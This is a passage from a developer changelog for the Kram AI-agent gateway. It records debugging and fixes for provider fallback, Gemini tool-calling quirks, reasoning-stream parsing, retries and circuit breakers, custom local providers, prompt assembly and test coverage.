must never be relayed to a caller as assistant content), and
`BoundedPeek`'s timer is now an *idle* timeout that resets on any event,
reasoning included. An earlier version of this fix also added a fixed
overall ceiling on top of the idle timer, on the theory that a model
reasoning forever without ever answering needed a hard stop regardless —
removed again after real traffic showed it actively harmful: a genuine
120B-class reasoning model (OpenRouter's nemotron) legitimately took
longer than that ceiling on real prompts, not stalled, just still
thinking, and got rejected mid-answer. The real "never answers at all"
backstop already exists one layer down: every provider adapter's
`http.Client` carries its own 120s timeout, which doesn't fire while
tokens keep arriving — the right place for an absolute ceiling.

**The two failures compounded into "almost never two prompts in a row."**
With Anthropic permanently unusable (see "Browser login" above — no API
credit balance) and Gemini permanently 404ing, only four of six
candidates were ever real options; two of those four were being killed
by the peek-timeout bug on nearly every attempt, and the remaining two
are OpenRouter's genuinely shared, genuinely rate-limited free capacity.
After live-verifying the fixes (three consecutive real prompts against
the actual configured combo, zero provider failures in the log, each
answered by the first candidate tried), that reduces to: one config
correction plus one real bug, not six independent flakes.

### A menu of available models would not have caught the Gemini failure on its own

Asked directly, and worth recording: Gemini's own `ListModels` response
listed the retired `gemini-2.5-pro` as supporting `generateContent` with
no warning — the "menu" itself was wrong, not just unconsulted. A
same-session check of OpenRouter's `/models` listing for the three
pinned free-tier slugs found no equivalent problem there — all three are
listed accurately (correct free pricing, correct tool support) and
degrade for real reasons (rate limits, the reasoning-timeout bug above),
not stale/wrong listings. So a future "discover available models
automatically" feature is a real, reasonable direction, but it can't be
"trust the list" — at least for Gemini, it would need an actual
generation-capable liveness check per candidate model, not just
presence in a catalog response, or it would inherit exactly this bug in
a more automated, harder-to-notice form.

### Gemini's tool-calling protocol had two more real bugs, both found from a real "all providers failed" log after the fixes above

Reviewing a fresh real session log (after the fixes above had already
shipped) showed a *different* Gemini failure — `400 Bad Request`, no
longer the 404 from the retired model. Traced the same way as
everything else in this section: reproduce the exact wire request the
real conversation would have sent, against the real API.

**`role: "function"` isn't valid.** `buildGeminiContents` sent tool
results as `{"role": "function", ...}`, matching Kram's own internal
"tool" role name — Gemini's real API rejects it outright: `"Role
'function' is not supported... USER, ... MODEL."` Fixed to `"user"`,
which is what Google's documented convention actually is; confirmed
live, and confirmed separate (non-grouped) turns per tool result — one
`user`-role content per result, matching Kram's existing per-message
structure — are structurally accepted, so no restructuring was needed
beyond the role name itself.

**Thinking-enabled models require their `thoughtSignature` echoed
back.** Past that, a second, different 400 appeared:
`"Function call is missing a thought_signature."` Gemini's newer
"thinking" models (the "latest" aliases pinned above default to this)
attach an opaque signed blob to each `functionCall` part they emit, and
require it echoed back unchanged on that exact call in later turns —
skip it and the request is rejected outright. This is genuinely new
provider-specific state with nowhere to live in Kram's existing
pipeline, so `openai.ToolCall` gained a `GeminiThoughtSignature` field
— it round-trips for free through the daemon's session storage, which
already `json.Marshal`s `[]openai.ToolCall` directly with no
intermediate stripped-down type. `gemini.go` now captures it off each
streamed `functionCall` part and re-attaches it when rebuilding history
for the next request.

Both were live-verified with the real wire format before writing any
Go — first via direct `curl` reproduction with a real, previously-issued
signature (confirmed a real `200` only once the role was `user` *and*
the real signature was echoed back correctly), then via the actual
built binary: a fresh session, forced onto a Gemini-only combo, given a
prompt that triggers three genuinely parallel tool calls
(`list_dir`/`git_status`/`read_file`) — all three ran and Gemini
correctly synthesized the final answer from their results, the exact
shape of turn that used to 400 on every attempt.

## Custom providers: a user-registered OpenAI-compatible endpoint (local/LAN servers)

`internal/providercatalog` was a fixed, compile-time list — no way to
point Kram at a local server (llama.cpp, LM Studio, Ollama's OpenAI
endpoint, vLLM) without hand-editing a generated `config.yaml`.
`internal/customprovider` adds a small user-editable store (name, URL,
optional model) reachable from the accounts screen's new "+ adicionar
provedor customizado" row — multiple entries, each independently named,
since "servidor de casa" and "servidor do trampo" are both real
simultaneous cases. The API key is optional (most local servers have no
auth) and, when present, is *not* stored in this new package at all — it
reuses `internal/credentials.Store` under a synthesized env var
(`CUSTOM_<ID>_API_KEY`), the same pattern an OAuth-connected account's
synthetic env var already established. One place for every secret.

### A custom provider with no key crashed the entire gateway, not just that one provider

Live-tested (see below) with a real no-auth local server and caught
immediately: `config.ProviderConfig.APIKey()` treated an unset
`APIKeyEnv` as a hard error unconditionally, which every provider path
before this one could safely assume never fires — `detectGatewayConfig`
only ever included a *catalog* provider when its env var was already
confirmed non-empty, so the error branch was structurally unreachable
for them. Custom providers break that assumption on purpose (existence
in the store, not a populated env var, is what "configured" means for
one — see the optional-key design above), and `provider.Build` calling
`APIKey()` for one with no key turned a "log a warning and skip this one
provider" situation into `gateway.Run` returning an error before
`ListenAndServe` — the whole gateway, and with it the whole `kram`
process, never came up. Fixed with a new `ProviderConfig.KeyOptional`
field, set only on custom-provider entries, so every other provider path
(catalog or a hand-written config.yaml) keeps today's strict behavior —
an unset required env var stays a clear startup error, not a silently
missing credential discovered later as a confusing 401.

### Live-verified against a real LAN server, not just the bundled mock

`devtools/mock-provider` (a real local OpenAI-compatible server already
in this repo, built for exactly this kind of testing) confirmed the
basic flow, but the user supplied a real server on their own network
mid-verification, which ended up testing more of the real path at once:
registered it through the actual accounts screen (name "lab", a real
`http://192.168.x.x:20128/v1` URL, a real key, later a pinned model), it
pinged green at real latency, and — forced onto a single-provider combo
to guarantee the fallback chain couldn't route around it — a real chat
turn completed through it end to end. This is also what surfaced the
`KeyOptional` bug above: the crash only reproduced against a real
gateway startup with a no-auth entry present, not against any unit test.

## A single missing provider credential crashed the whole gateway

Real user report, reproduced exactly: `kram` refused to start at all —
`gateway didn't come up: ... connection refused` — with no indication of
why. `waitHealthy`'s timeout error was the only thing surfaced; the real
cause had already landed on `gateway.Run`'s internal `errCh` and was
silently discarded. Fixed first in `cmd/kram/main.go` (peek `errCh`
before falling back to the generic timeout message) and
`internal/gateway/gateway.go` (log the real cause too, so it survives in
the log file even if a caller ignores it) — which surfaced the actual
error: `building provider "anthropic": env var ANTHROPIC_API_KEY is not
set`.

That pointed at the deeper bug: a global `config.yaml`, written once by
an earlier wizard run, still listed Anthropic as a required provider —
its credential had since been deleted (via the accounts screen's "d"
key, confirmed working; see below). `provider.Build` correctly failed
for that one provider, but `gateway.Run`'s build loop treated *any*
single provider failure as fatal for the entire process — one stale
config line took down all six configured providers, the opposite of the
fallback-chain resilience this project is built around (see "The
default combo's fallback chain" above).

Fixed at two layers, since fixing only one just moves the same crash:
`gateway.Run` now logs a warning and skips a provider that fails to
build instead of aborting, only erroring if literally zero providers
end up built. `sanitizeCombosForBuiltProviders` (new, `gateway.go`) then
strips any now-missing provider ID out of every combo before handing
the config to `router.New` — which keeps its own stricter check
unchanged (a combo referencing a provider ID that was never *declared*
in `cfg.Providers` at all is still a real config typo worth a hard
error). A combo left with zero providers after filtering is dropped
entirely; if it was `default_combo`, the first surviving combo takes
over that role, logged either way. Deliberately *not* touched:
`config.Validate()`'s static check that every combo references a
provider ID that exists somewhere in the declared provider list — that
catches a different, still-real bug class (hand-edited config typos)
and stays strict.

Live-verified with the user's own real state (`/home/codexmark/.kram`,
Anthropic/Gemini/OpenCode-Zen credentials genuinely absent, three
OpenRouter providers genuinely present): the real log now reads three
`skipping provider that failed to build` warnings, three `provider
ready` lines, three `dropping unbuilt provider from combo` warnings, and
`kram-gateway listening` — followed by real `/health` 200s from both the
gateway and the daemon. Also covered by
`internal/gateway/gateway_test.go` (new): `sanitizeCombosForBuiltProviders`
directly (dropping a provider from a combo, dropping an empty combo and
reassigning `default_combo`), and `Run` end-to-end (one broken + one
working provider still serves; all-broken still fails fast).

### The "d" key not deleting a provider was two separate, narrower bugs, not the router

Investigated in parallel since the user reported it alongside the crash
above. `internal/cli/app/accounts.go`'s `"d"` handler blocked *all*
deletion unconditionally whenever `wizardMode` was true — a leftover
from before custom providers existed, when catalog credentials really
were the only thing on this screen and "nothing to undo during setup"
was a reasonable rule. Custom providers changed that: a mistyped
URL/name registered mid-wizard now has no way to be corrected before
finishing setup. Fixed by scoping the wizard-mode restriction to only
the catalog-row case, confirmed by six new focused tests in
`accounts_test.go` covering every row type and mode combination
(`TestDeleteKeyRemovesStoredCatalogCredential`,
`TestDeleteKeyOnCustomProviderWorksDuringWizardSetup`, etc.) — direct
`handleAccountsKey` calls, not live TUI, once tmux in this environment
became too unstable to drive reliably for this particular investigation.
Separately, direct inspection of the user's real
`~/.config/kram-gateway/credentials.json` showed Anthropic's key was, in
fact, already gone — proof the delete logic itself had already worked
correctly at least once; the crash above is what made it *look* like
deletion had failed.

## A local reasoning server's "no meaningful content" failures were a second, different reasoning-field bug

Right after the resilience fix above shipped, live traffic against the
user's real accounts (`/home/codexmark/Projects/.kram/kram.log`) showed
every single candidate in the active combo failing on the same turn:
three OpenRouter free models with genuine `429 Too Many Requests` (real
rate limits, nothing to fix), and the user's own registered local
server ("lab", a real LAN endpoint) with `no meaningful content within
the peek window` — the same symptom the OpenRouter reasoning-chunk bug
produced earlier (see "The default combo's fallback chain" above), but
that fix was already live, so this had to be something else.

Reproduced directly against the real server with `curl -N` on a
streaming chat-completion request: it *is* a reasoning model, and it
*does* stream chain-of-thought — but under `delta.reasoning_content`,
not OpenRouter's `delta.reasoning`. `internal/provider/openai_compat.go`
only ever parsed the latter, so this server's reasoning stream, and by
extension its liveness, was completely invisible to `router.BoundedPeek`
— it looked like dead silence for the full idle window even while
actively producing tokens the whole time. `reasoning_content` is not
this one server's idiosyncrasy; it's the field name vLLM's reasoning
parser and DeepSeek-R1-compatible APIs commonly use, so this was always
going to bite the *next* self-hosted server someone registered too, not
just this one. Fixed by reading both field names into the same
`StreamEvent.Reasoning` signal (`openaiCompatChunk.Delta` gained a
second field, `ReasoningContent`; a chunk populates at most one of the
two, so summing them is just "whichever one this server sent").

Live-verified against the real server, not just a mocked test: a small
throwaway program (`provider.Build` → `ChatCompletion` →
`router.BoundedPeek`, run once via `go run` and deleted after) showed
`BoundedPeek` committing in ~190ms with the reasoning fragments correctly
captured, versus the unconditional idle-timeout failure before the fix.
Also covered by two new table-driven-style tests in
`internal/provider/openai_compat_test.go` against a local `httptest`
SSE server: one for each field name, so a regression in either direction
gets caught without needing a live server.

## Phase 1 hardening: making the fallback/retry story actually true end to end

A deep architectural review (prompted directly by the two fixes above —
the model-swap crash and the reasoning-field bug — reading as symptoms
of a pattern, not two unrelated bugs) found the promise "Kram falls back
across providers" broke down in several concrete, verified places. Every
claim below was checked against the real code before acting on it — some
turned out to be stale (an earlier `BoundedPeek` overall-time-ceiling the
review cited had already been removed the same session) or need
refining (a specific rejection path needed its own classification rather
than reusing the generic one), which is itself worth recording: a review
this size is worth verifying line by line, not applying wholesale.

**The core problem**: every internal agent→gateway model call went
through the streaming path (`ChatCompletionStream`), which commits to
one candidate the instant `router.BoundedPeek` sees a meaningful first
signal — HTTP headers go out, and if that candidate then dies mid-stream
there is no more fallback for that request, full stop. Meanwhile
kram-gateway's own *non-streaming* branch already tried every ranked
candidate to completion before ever writing a byte back to its caller —
a fully resilient path that already existed and was simply never the
default. Fixed by flipping the default: `internal/daemon/agent`'s
`callModel` now calls the buffered `ChatCompletion` unless
`Config.PreferStreaming` opts back in. This also just restored what the
package's own doc comment always claimed ("tool execution waits for a
complete, non-streaming model response") — the streaming-only
implementation had quietly drifted from its own documented design.
Losing live per-token deltas risked the CLI's stall-warning misfiring on
a longer buffered wait, but `model.go`'s stall clock already resets on
*any* event type unconditionally, so a new payload-free `EventHeartbeat`
ticking during the wait was enough — zero CLI changes needed. Live-
verified against real gateway+daemon processes: a 9s buffered call
produced 2 heartbeats (matching the interval) before the real
`route_done`.

**No retry existed anywhere.** One failed pass through a combo's ranked
candidates was final — a 429 that would likely succeed a moment later
got the exact same treatment as a permanently broken configuration.
Fixed with `callModelWithRetry` (`internal/daemon/agent/retry.go`): up
to `MaxGatewayRounds` (default 3) full fresh attempts, backoff+jitter
between them (floored by a real `Retry-After` when the upstream sent
one), gated on a new `FailureClass` taxonomy (`internal/openai/failure.go`)
so a non-retryable failure (400, cancelled) fails immediately instead of
burning rounds pointlessly. Runs entirely inside one turn-loop iteration
— it never touches `MaxTurns`, since no new model decision happened.
Re-ranking between rounds needed zero new gateway code: every
`ChatCompletion` call already re-ranks fresh server-side, so a provider
that tripped open in round 1 is automatically reflected in round 2.
Live-verified: 2 real 500s from `mock-provider` produced visible retry
notices with real exponential backoff (467ms, 954ms) before a real
round-3 success.

**The all-failed response was a flat string.** `"all providers in combo
%q failed, last error: %v"` gave a caller no way to tell a `429` from a
`400` without parsing English prose. `ErrorBody` gained `Combo,
Retryable, RetryAfterMS, Cause, Attempts` (kram-gateway extensions,
ignored by any standard OpenAI client), and `gatewayclient` decodes them
into a typed `GatewayError` — falling back to the old flat-string
behavior for any non-Kram OpenAI-compatible server's plain error, so
`ChatCompletion` keeps working against those too.

**A Kram-caused bug could poison a perfectly healthy provider's circuit
breaker.** The real historical case: the Gemini `role:"function"` bug
(see above) produced a `400`, and `markFailure` reported that to the
breaker exactly like a genuine `500` would — a bug in Kram's own request
construction taking a healthy upstream out of rotation. `FailureClass`
distinguishes `ClassInvalidRequest` (Kram's fault, doesn't count) from
real transport instability (does count) — with one refinement found by
reading `chat.go` directly rather than trusting the review's framing: a
`BoundedPeek` timeout or a `ResponseGate` rejection are *not* transport
failures either (no real HTTP status, a synthetic wrapped reason
string), so they get their own `markRejection` path, classified
`ClassContentRejected` directly rather than run through `Classify` at
all — running them through `Classify(0, err)` would have misclassified
them as network failures. Live-verified: 4 consecutive real 400s from
`mock-provider` left `breaker_open=false` in `/admin/status`; a genuine
500 still trips it after 3.

**The circuit breaker's half-open state wasn't actually single-flight.**
The code's own comment claimed "only one trial in flight at a time" —
`Allow`'s `halfOpen` case just returned `true` unconditionally for every
caller. Fixed with a real `trialAt` gate (`internal/breaker/breaker.go`,
which had zero test coverage before this — first test file added along
with the fix), including a timeout safety net for a trial whose outcome
never gets reported. The regression test spins 50 concurrent goroutines
during half-open and asserts exactly one is admitted.

**`BoundedPeek` was blind to tool-call progress.** All three provider
adapters (not just the one originally suspected — `openai_compat.go`,
`anthropic.go`, and `gemini.go` all had the identical bug) accumulate
tool-call argument fragments into an internal buffer with zero matching
`StreamEvent`. A provider streaming a long tool call's arguments with no
leading text looked like dead silence and could get killed as stalled
mid-work. New `StreamEvent.ToolCallProgress` gets the same treatment
`Reasoning` already has — resets the idle timer *and* is exempt from
`streamPeekMaxEvents`, not just counted (a naive fix that only reset the
counter would still exhaust the budget on a long enough tool-call-only
stream).

**A `config.yaml` written once stayed frozen forever.** Once that file
existed, `detectGatewayConfig` — the only function that re-scans
`customprovider.Store`/credentials for anything added since — never ran
again; a provider or account connected via the Accounts UI afterward was
invisible until the file was hand-edited or deleted. `reconcileLiveProviders`
(`cmd/kram/autodetect.go`) now additively merges anything new into a
loaded file on every boot: appends missing providers by ID, appends them
to the *end* of `DefaultCombo`'s list (lowest priority, so a hand-tuned
ordering is never reshuffled), and touches nothing else. Live-verified:
a hand-written config.yaml declaring only `anthropic`, plus a
`custom_providers.json` entry absent from it, produced "reconciled
newly-configured provider" log lines and a gateway with every live-
credentialed provider actually built and routable.

**A custom provider with no pinned model silently corrupted its own
requests.** `req.Model` at the point any provider adapter reads it is
always the *combo ID* for a Kram-originated call (`agent.Config.Model`'s
own doc comment says so) — never a real upstream model name. The
documented "passthrough" option (empty `Model` = forward whatever was
asked) therefore never actually worked for any caller; it silently sent
something like `{"model":"default"}` upstream. There is no real
architecture anywhere that carries a genuine "requested upstream model"
distinct from the combo selector, so building one wasn't in scope for a
hardening pass — `customprovider.Store.Add` now requires a model, same
as it already requires a name and URL. `SupportsTools` was also
hardcoded `true` for every custom provider with no way to override it;
now a real field (default `true`, matching today's behavior for the
common case — most OpenAI-compatible local servers do support tool
calling) with a toggle in the Accounts UI form.

Also added along the way: `devtools/mock-provider` gained `-fail-status`,
`-fail-first-n`, and `-retry-after-s` flags — every live-verification
step above needed at least one of them, and building the knobs once up
front avoided re-touching that file piecemeal per fix.

## Prompt Compiler v1: a structured, inspectable preamble — behavior-preserving

A research study (`KRAM_Estudo_Mestre_Agentes_Competitivos.md`, synthesizing
how Claude Code, Hermes Agent, OpenCode, Codex, and Antigravity structure
their agent runtimes) proposed ten major subsystems for Kram's prompt/agent
architecture. Its own recommended ordering — and its closing "Status"
section — say the same thing: hardening first (the pass above), then turn
the rest into a *sequence* of scoped changes, not a single wholesale
implementation. This is the first and only item taken from that sequence
so far: item 2, "Prompt Compiler + Instruction IR", done exactly as the
study's own §2 requires — replace the ad hoc preamble-building code with
something structured, **without changing behavior**.

Before touching anything, what `runLoop` actually did was read directly
out of the code rather than assumed: `systemPrompt(workspace)` is
constant for a given workspace; `loadProjectContext` re-reads
`AGENTS.md`/`CLAUDE.md` from disk fresh on *every* internal tool-loop
iteration (deliberate real-time reactivity); `recentMemoryMessage` is
computed once per `runLoop` call and frozen across that turn's internal
iterations, specifically to preserve the provider's prefix cache across
tool round-trips. Three genuinely different cadences, not the three a
first draft of this plan initially assumed — an early "Static/Session/
Turn" grouping conflated AGENTS.md's per-iteration refresh with memory's
per-run freeze under the same "Session" label, which a review caught
before any code was written: the fix was naming the field
`RefreshPolicy` with values `RefreshStatic`/`RefreshRun`/`RefreshIteration`,
matching the three cadences that actually exist instead of an invented
taxonomy.

New `internal/daemon/agent/promptcompiler.go`: `PromptPart{ID, Placement,
Refresh, Source, Content}`, `compilePreamble(...)` and
`compileTurnPostscript(...)` reproducing exactly what the inline code
built (same messages, same order, same conditionals), `partsToMessages(...)`
rendering them as `system`-role `openai.ChatMessage`s. `Placement`
(`PlacementPreamble`/`PlacementPostHistory`) is real data on the part
rather than only encoded in which function produced it — the same review
pointed out that once more post-history reminders exist (a Reminder
Engine's whole purpose), position will matter as much as content. Neither
`Placement` nor `Refresh` nor `Source` conditions any behavior yet in v1;
they exist because the *next* phase (Model/Agent Profiles, deliberately
not started here) needs a real vocabulary to filter against instead of
starting from scratch, and because a future prompt-inspection view
(`/debug prompt`, not built yet) needs `Source` to say where each part
came from. Explicitly not added: a `Role`/`Kind` field distinguishing IR
content from wire format — that decision belongs to whichever phase first
needs a non-OpenAI-shaped instruction, not this one; deciding it now
would be guessing ahead of a real second consumer.

One deliberate exclusion: `toolDefs = nil` on the final allowed turn stays
a plain line in `runLoop`, not part of the compiler. Tool *visibility* is
a runtime/policy question, not prompt content — the same separation this
project already drew between "capability" and "policy" elsewhere.
Folding it into the compiler would start turning it into exactly the
kind of monolith the underlying study warns against.

**Verification, upgraded partway through from a one-off manual check to
a permanent regression test** (another review suggestion, accepted): unit
tests in `promptcompiler_test.go` cover the pure functions; a new
`TestRunLoopPromptAssemblyContract` in `promptassembly_test.go` drives a
real `Service.Run` (real store, real tools registry, real `AGENTS.md` on
disk, a real seeded memory entry) against a scripted `httptest` gateway
that captures the actual `ChatCompletionRequest.Messages` it receives,
and pins the exact message-index contract: `[0]` base prompt, `[1]`
AGENTS.md, `[2]` memory, `[3...]` history. Two more integration tests
cover the post-history cases specifically: `MaxTurns:1` to force the
near-budget message onto the very first turn, and a two-round-trip
script (empty reply, then a real one) to prove the empty-retry nudge
actually appears on the retry request, not just in a unit test of the
function that builds it. This is the contract a Model Profile or
Reminder Engine phase will have to consciously change, not silently
break. Live-verified once more end to end against the real installed
binary (`~/.local/bin/kram`, real separate gateway+daemon processes,
`devtools/mock-provider`, a workspace with a real `AGENTS.md`) — a
genuine turn completed cleanly with no wiring regression.

## Gateway Round retry: "last attempt wins" was the wrong retry decision

A second review of the hardening pass above (by the same reviewer who
caught the `RefreshPolicy` naming issue during the Prompt Compiler's
design) found a real bug in `writeGatewayError`'s `Retryable` field: it
was computed from only the *last* attempt in the fallback trail, on the
stated reasoning that "the last attempt is the one that actually ended
the request." That reasoning doesn't hold up. A concrete counterexample
makes it obvious: three candidates ranked A, B, C; A fails `429` (rate
limit, retryable), B fails `503` (server error, retryable), C fails
`404` (retired/unknown model, not retryable — see the Gemini
retired-model incident earlier in this document for exactly this
failure mode in the wild). Whichever candidate happens to be *last* in
ranking order is an accident of priority/strategy, not evidence the
whole round is hopeless — under the old logic, C being last meant
`Retryable=false` and the Gateway Round retry never fired, even though A
or B might have succeeded moments later.

Fixed in `writeGatewayError` (`internal/server/chat.go`): `Retryable` is
now true if *any* attempt in the trail was retryable, computed by
scanning the whole trail instead of indexing the last entry. `Cause`
still reflects the last attempt specifically — that's still meaningful
as "what ultimately ended this request" for display/logging, just no
longer conflated with the retry decision. `internal/daemon/agent/retry.go`
needed no logic change (it already just trusts `GatewayError.Retryable`
from the wire) — only its comment, which restated the same now-wrong
reasoning, got corrected.

New `TestAllProvidersFailedIsRetryableIfAnyAttemptWas` in `chat_test.go`
reproduces the exact A/B/C counterexample and asserts `Retryable=true`
with `Cause` still reporting C's class. Live-verified against three real
`mock-provider` instances (429/503/404) behind a real gateway: the raw
JSON response now reads `"retryable": true, "cause": "invalid_request"`
— previously would have been `"retryable": false`.

Same review also flagged a factual error in `router/stream.go`'s comment
about why the provider-adapter `http.Client`'s 120s timeout is a safe
backstop: it claimed the timeout "doesn't fire while tokens keep
arriving," which isn't how Go's `http.Client.Timeout` works — it's a
hard ceiling on the entire request lifetime (dial through full body
read), not an idle timer that resets per byte. Comment corrected to
state this accurately, including the real (previously undocumented)
consequence: a stream still slowly, genuinely producing tokens past
120s total would still get cut off there. No behavior changed, only the
documentation of an existing, real limitation.

Two other findings from the same review — non-`GatewayError` transport
errors (daemon↔gateway network failures) not going through retry
classification at all, and 404 being lumped into the same
`ClassInvalidRequest` bucket as a genuine malformed-request bug instead
of a distinct "model/route unavailable" class with its own
cooldown — are real and confirmed, explicitly scoped out of this pass at
the reviewer's own direction ("depois disso, eu pararia de mexer nessa
camada") and left for whenever this layer is revisited next.

## Tool Semantics Registry v1: the prompt's Tools section is now generated, not hand-maintained

Found while testing Kram against a real second project ("talonario", a
React Native/Expo app run explicitly as a dogfooding test): asked to
start the dev server, Kram correctly refused `bash` for a long-running
process, but never reached for `run_background` — a tool that already
existed, was well-suited, and was already registered — because
`systemPrompt()`'s hand-written "# Tools" section never mentioned it.
Diffing the real tool registry (`Registry.AllTools()`) against that
hand-written section found the gap was far bigger than one tool: 21 of
38 registered tools were never mentioned in the prompt at all. This is
the same failure mode this file's own "How you work" prompt guidance
warns about — a tool being in the schema is not an instruction to use
it — except the instance was in Kram's own prompt-authoring process, not
a model's behavior. A quick patch (adding `run_background`/
`delete_file`/`move_file`/`snapshot_create` by hand) shipped first, in
`v0.2.1`, to close the immediate gap; this entry is the structural fix
that makes the whole bug class impossible instead of patched once.

New `internal/daemon/tools/toolmetadata.go`: a `ToolMetadata{Summary,
PreferOver}` struct, a `MetadataProvider` interface a `Tool` can
optionally implement, and `Registry.ToolMetadata(name)`, which returns
the tool's hand-curated metadata if it implements `MetadataProvider`, or
derives a fallback from the first sentence of its existing
`Description()` otherwise. The fallback is the property that makes the
bug structurally impossible: a tool cannot go unmentioned just because
nobody got around to writing a `Summary` for it, the same way it
previously went unmentioned because nobody got around to updating a
hand-written paragraph.

`internal/daemon/agent/promptcompiler.go` gained
`compileToolsOverview(reg *tools.Registry) PromptPart`, iterating every
visible tool (see `Registry.VisibleTools()`, corrected below) in name
order, rendering `name — Summary` and, when set, `PreferOver` as `"(use
this instead of X)"` — the exact cross-reference `run_background` needed
against `bash`. `compilePreamble` gained a `*tools.Registry` parameter
and inserts this part right after `base`, before `project-context`.
`systemprompt.go`'s hand-written "# Tools" section was deleted outright,
replaced by a doc-comment pointing at the generator.

**Correction, caught by review:** this section originally claimed the
generated part landed "structurally where the old hand-written Tools
section already sat." That's not accurate and is worth being honest
about. Before this change, `# Tools` lived *inside* `systemPrompt()`'s
own template, between "# How you work" and "# Skills" — one single
system message. After this change, the generated tools-overview is a
*separate* system message, inserted by `compilePreamble` after `base`
and before `project-context`/`memory`, which — because `base` itself
still ends with "...# Safety" — puts Tools structurally *after* Skills/
Memory/Delegation/Asking/Writing-code/Output/Safety, not where it used
to sit relative to them. Not necessarily worse — Tools landing right
before project context and conversation history may even help
salience — but it was an unexamined side effect of the refactor, not a
deliberate placement decision, and this file shouldn't have described it
as one. Recorded here as a deliberate placement now that it's been
looked at: Tools stays a separate post-`base` message. A real Model/
Agent Profile phase splitting `base` itself into named parts (identity,
workflow, tools, skills, memory-policy, delegation, coding-policy,
safety) — so ordering is an explicit, inspectable property of the parts
list instead of implicit in a single template string — is the natural
next step for this file, not attempted here.

Migrated today's already-approved wording into `ToolMetadata()` methods
for the 14 tools that were already manually listed
(`read_file`/`list_dir`/`glob`/`grep`/`edit_file`/`write_file`/`bash`/
`run_background`/`delete_file`/`move_file`/`snapshot_create`/
`git_status`/`git_diff`/`todo_write`). The other ~24 tools
(`lsp_*`/`mcp_*`/`memory_*`/`session_search`/`skill*`/
`snapshot_list`/`diff`/`restore`/`todo_read`/`web_fetch`/`ask_question`/
`delegate_task`/`artifact_read`/`process_*`) stay on the automatic
fallback for now — correctly *listed*, which is the actual bug this
closes, not yet hand-tuned with a `PreferOver`. Curating more of them is
a low-risk follow-up whenever real usage shows the same "competes with a
default habit" pattern `run_background` vs. `bash` did, not something
worth guessing at wholesale up front.

One naming note worth recording: `write_file`'s `ToolMetadata` carries
no `PreferOver`, deliberately. The field means "prefer *this* tool over
X" — and for `write_file` the correct direction is the opposite (prefer
`edit_file` over it), which is already what its negated Summary says
("Only for new files, or a rewrite so total that editing makes no
sense."). Adding `PreferOver: "edit_file"` to `write_file` itself would
have inverted the field's meaning.

Splitting the preamble into an additional system message (base /
tools-overview / project-context / memory, instead of base folding
Tools in directly) was confirmed safe before relying on it: both
`internal/provider/anthropic.go` and `internal/provider/gemini.go`
already concatenate multiple system messages into one on the wire, so
every provider Kram talks to already handles this shape.

Tests: `toolmetadata_test.go` covers `Registry.ToolMetadata` — a tool
implementing `MetadataProvider` wins verbatim, a tool that doesn't falls
back to its `Description()`'s first sentence, an unregistered name
returns a usable zero value without panicking, plus a live check
(`TestRealRegistryEveryToolHasAUsableSummary`) that every tool in the
real production registry produces a non-empty summary. New
`compileToolsOverview` unit tests in `promptcompiler_test.go` use the
real `tools.NewRegistry` (which already takes a `disabled` map as a
constructor argument, so no fakes were needed) to confirm a disabled
tool is skipped, `PreferOver` renders, and a tool with no curated
metadata still appears via fallback. The regression test that actually
matters, `TestRunLoopPromptAssemblyEveryEnabledToolAppearsInPrompt` in
`promptassembly_test.go`, drives a real `Service.Run` against the real
tool registry and asserts every currently-enabled tool name appears
somewhere in the generated prompt — the literal, permanent proof that a
tool cannot silently go unmentioned again, not a hand-picked subset of
one.

Live-verified against real separate `mock-provider`/gateway/daemon
processes (not just the test suite): a real turn's captured request
messages show the generated `# Tools` section listing all 34 enabled
tools, including `run_background — ... (use this instead of bash)` —
confirming the fix holds with the real registry wiring, not just the
mocked one in tests, and that it now produces this without the v0.2.1
patch's hand-written lines, which were removed outright rather than
kept as a redundant fallback.

## Test coverage push: closing the zero- and weak-coverage packages

Prompted by a direct question about the repo's current test coverage
(`go test ./... -cover`): aggregate was 44.1%, and a handful of packages
carrying real logic — not just thin glue — sat at 0%: `internal/daemon/
compaction`, `internal/daemon/server`, `internal/daemon/session`,
`internal/cli/daemonclient`, `internal/cli/statusclient`,
`internal/kramhome`, `internal/telemetry`. `internal/oauthflow` sat at
3.5% (only its PKCE math was tested — every actual browser-login flow
was untouched). `internal/provider` and `internal/daemon/gatewayclient`
were both at ~46%, healthy on their most-exercised paths (Anthropic/
Gemini/OpenAI-compat streaming, the Gateway Round retry's structured
error) but with `openai_responses.go`, `factory.go`, `sse.go`,
`toolcalls.go`, `ChatCompletionStream`, and `Status`/`ComboSupportsImages`
never touched at all.

Went package by package, adding tests without changing behavior anywhere
except one deliberate, narrow exception (below):

- **`internal/provider`**: new `toolcalls_test.go`, `sse_test.go`,
  `factory_test.go`, `openai_responses_test.go` — the accumulator's
  index-ordering and stale-fragment-doesn't-overwrite-name/ID behavior,
  `scanSSEData`'s line-skipping and early-stop, `Build`'s full kind ×
  auth-mode matrix, and `OpenAIResponses.ChatCompletion` (text deltas,
  function-call assembly across `output_item.added` +
  `function_call_arguments.delta`, HTTP error, resolve-error
  propagation, the resolved token actually landing in the `Authorization`
  header). 45.9% → 68.9%.
- **`internal/daemon/gatewayclient`**: new `status_test.go`,
  `stream_test.go` — `Status()` decode/error paths, `ComboSupportsImages`
  true/false/unknown-combo, `ChatCompletionStream`'s text-delta assembly,
  tool-call-on-finish, `finish_reason: "error"` → `StreamDelta.Err`,
  malformed-chunk skipping, plus `ChatCompletion`'s no-choices/decode-
  error/non-JSON-error-body paths the existing `client_test.go` didn't
  reach. 45.9% → 84.7%.
- **`internal/daemon/compaction`** (new): `EstimateTokens`,
  `EffectiveHistory` (marker-seeking, ignoring same-role-different-name
  system messages), `NeedsCompaction`'s default-budget fallback,
  `PruneForModel` (protected tail, tool-only, size threshold, and —
  worth calling out — a mutation test proving it never touches the
  caller's slice in place, which is the whole reason the CLI/audit trail
  can show real tool output after a session compacts), and `Compact`
  against a real `gatewayclient.Client` pointed at an `httptest.Server`,
  confirming the reference-only wrapping this package's own doc comment
  exists specifically to prevent (see the opencode/Crush re-execution
  bug this package was built to avoid). 0% → 97.4%.
- **`internal/daemon/session`** (new): `Create`/`List`/`Get` (found and
  `ErrNotFound`), `NewID`'s prefix and uniqueness. 0% → 86.7%.
- **`internal/kramhome`** (new): `Dir()`'s `XDG_CONFIG_HOME` vs.
  `$HOME/.config` fallback, the deliberate `kram-gateway` (not `kram`)
  naming this file's own doc comment explains, `Path()`'s joining. 0% →
  81.8%.
- **`internal/telemetry`** (new): every counter (`RecordAttempt/Failure/
  Usage/Latency`), `Snapshot`'s average-latency and success-rate math
  including the zero-request divide-by-zero guard, per-provider
